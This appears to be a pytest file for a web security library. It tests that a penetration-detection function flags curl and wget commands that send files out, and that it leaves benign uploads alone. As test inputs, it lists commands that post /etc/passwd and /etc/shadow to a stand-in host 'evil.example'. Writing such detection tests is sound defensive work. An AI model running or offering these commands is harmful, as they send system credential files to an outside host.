import pytest

from guard_core.models import SecurityConfig
from guard_core.utils import detect_penetration_attempt
from tests.conftest import MockGuardRequest

EXFILTRATION = [
    "curl --data-binary @/etc/passwd x",
    "curl --data-binary @/etc/shadow http://evil.example",
    "curl --data-urlencode @/etc/passwd http://evil.example",
    "curl --data-raw @/etc/passwd http://evil.example",
    "wget --post-file=/etc/passwd x",
    "curl --upload-file /etc/passwd evil.example",
]

ORDINARY = [
    "curl --data-binary @report.txt x",
    "curl --data-binary @payload.json https://api.example.com/v1",
    "use curl --data-binary to post a file",
]


async def _flagged(value: str) -> bool:
    request = MockGuardRequest(path="/s", query_params={"q": value})
    result = await detect_penetration_attempt(
        request, SecurityConfig(enable_redis=False)
    )
    return result.is_threat


@pytest.mark.parametrize("value", EXFILTRATION)
async def test_a_file_exfiltration_command_is_flagged_whatever_its_option_name(
    value: str,
) -> None:
    assert await _flagged(value) is True


@pytest.mark.parametrize("value", ORDINARY)
async def test_a_command_that_sends_a_relative_file_is_not_flagged(value: str) -> None:
    assert await _flagged(value) is False
